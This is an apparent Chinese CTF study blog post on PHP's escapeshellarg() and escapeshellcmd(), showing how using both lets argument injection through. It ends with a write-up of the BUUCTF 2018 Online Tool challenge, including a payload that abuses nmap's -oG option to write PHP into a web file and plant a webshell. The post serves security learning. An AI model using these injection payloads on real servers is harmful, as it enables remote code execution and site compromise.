+++
title = 'escapeshellarg和escapeshellcmd'
date = '2023-10-07T15:48:00+08:00'
categories = ['刷题', '学习', 'web']
tags = ['php', 'rce', '安全']
+++

## escapeshellarg()

看官方给出的解释：
escapeshellarg — 把字符串转义为可以在 shell 命令里使用的参数。

**escapeshellarg()** 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含[exec()](https://www.php.net/manual/zh/function.exec.php)、[system()](https://www.php.net/manual/zh/function.system.php) 和[执行运算符](https://www.php.net/manual/zh/language.operators.execution.php) 。

在 Windows 上，**escapeshellarg()** 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(`\`)都会被一个额外的反斜线所转义。

也就是说，他会确保我们传入的参数是安全的，将引号经过转义重新组成。

看一下例子：(在linux下跑，win下看不到效果)

```php
<?php
$a="xx";
$b=escapeshellarg($a);
echo $b ;
echo("\n");
//输出   'xx'
```

添加引号输出。

再看：

```php
<?php
$a="x'x";
$b=escapeshellarg($a);
echo $b ;
//输出 'x'\''x'
<?php
$a="x''x";
$b=escapeshellarg($a);
echo $b ;
//输出 'x'\'''\''x'
```

因为我们加了一个引号，他将引号转义表示并且输出。

### 知识点：

linux中反引号：带上反引号的命令，反引号内的命令先执行一次，再将结果执行一次

![image-20231007204436497](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310072044549.png)

第一步:先执行反引号内部的命令，结果为 cat 1.txt
第二步:将结果再执行一次，也就是 cat 1.txt

linux中的单引号和双引号:

区别：**单引号属于强引用，它会忽略所有被引起来的字符的特殊处理，被引用起来的字符会被原封不动的使用；而双引号属于弱引用，它会对一些被引起来的字符进行特殊处理**。 简单来说，单引号直接输出内部字符串，不解析特殊字符；双引号内则会解析特殊字符

看下图片：![image-20231007204747963](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310072047992.png)

如果在参数拼接时，使用了双引号的话，即使使用了escapeshellarg()，也可能导致命令执行漏洞。

## escapeshellcmd()

看官方给出的解释：
escapeshellcmd — shell 元字符转义

**escapeshellcmd()** 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 [exec()](https://www.php.net/manual/zh/function.exec.php) 或 [system()](https://www.php.net/manual/zh/function.system.php) 函数，或者 [执行操作符](https://www.php.net/manual/zh/language.operators.execution.php) 之前进行转义。

反斜线（\）会在以下字符之前插入：`&#;`|*?~<>^()[]{}$\`、`\x0A` 和 `\xFF`。 `'` 和 `"` 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符前面都有一个插入符号（`^`）。

也就是说，对于单引号和双引号，如果不配对，不配对的就被转义，还是看例子吧

```php
<?php
$a="x'x";
$b="x''x";
$c="x'''x";
echo escapeshellcmd($a);
echo("\n");
echo escapeshellcmd($b);
echo("\n");
echo escapeshellcmd($c);
//x\'x
//x''x
//x''\'x
```

成对的不转义，不成对的进行转义，而对于非单引号和双引号的，那就都转义喽



## 两个结合：

```php
<?php
	$payload = "127.0.0.1' -o 5.php";
    $a = escapeshellarg($payload);
    echo $a;//   '127.0.0.1'\'' -o 5.php'
    echo "\n";
    $b=escapeshellcmd($a);
	  echo $b;//   '127.0.0.1'\\'' -o 5.php\'
  	system("curl " . $b);
?>
```

解释一下过程：

- 经过escapeshellarg函数，两变加上单引号，中间的单引号进行转义 =='127.0.0.1'\\'' -o 5.php'==

- 经过escapeshellcmd函数，\进行转义，最后的引号进行转义 =='127.0.0.1'\\\\'' -o 5.php\\'==

- 执行curl，此时 '127.0.0.1'\\\\'' -o 5.php\\'被分为3部分。curl 127.0.0.1\ -o 5.php',也就是向127.0.0.1发送请求，-o 5.php'为参数。'127.0.0.1'就是传入进来的字符串，也就是127.0.0.1，\\\转义后也就是\, '' 成对的单引号被shell忽略，最后 \\' 被转义为 '

  

此时我们看到最后为5.php' 文件，而我们想要5.php文件，只要在5.php ’ 之间加一个空格就可以了。这时，引号将被当作单独的参数使用。

## [BUUCTF 2018]Online Tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);//创建目录
    chdir($sandbox);//设置为当前目录
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

可以看到上面两个函数一起进行了使用，最后使用 nmap命令,在nmap中，-oG可以将结果输出到文件，也就是可以写马。

```xml
如果直接传 <?php phpinfo();?> -oG 1.php
经过函数后为 ：'\<\?php phpinfo\(\)\;\?\> -oG 1.php '  
传    '<?php phpinfo();?> -oG 1.php '
经过函数后为 ：''\\''\<\?php phpinfo\(\)\;\?\> -oG 1.php '\\'''
```

很明显第一个是写不进去的，不符合格式，第二个可以写进去，然后写马即可。

